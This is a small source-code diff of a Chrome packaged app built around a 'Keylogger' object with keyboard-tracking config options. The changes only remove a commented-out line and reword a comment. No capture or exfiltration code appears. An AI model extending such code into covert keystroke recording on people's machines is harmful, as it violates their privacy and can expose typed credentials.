@@ -4,7 +4,6 @@
 //var documentWin = null;
 chrome.app.runtime.onLaunched.addListener(function() {
   chrome.app.window.create('status.html', __config.opt_window);
-  //documentWin = (chrome.app.window.get(__config.opt_window.id)).contentWindow.document;
 });
 
 var Keylogger = function() {
@@ -23,7 +22,7 @@ var Keylogger = function() {
         if (content.config.opt_keyboard) { this.keyboard = content.keyboard; } else { this.keyboard = null; }
     };
     
-    // This function returns the whole JSON object
+    // This function returns the whole object
     /*
     ret = {
         time : {
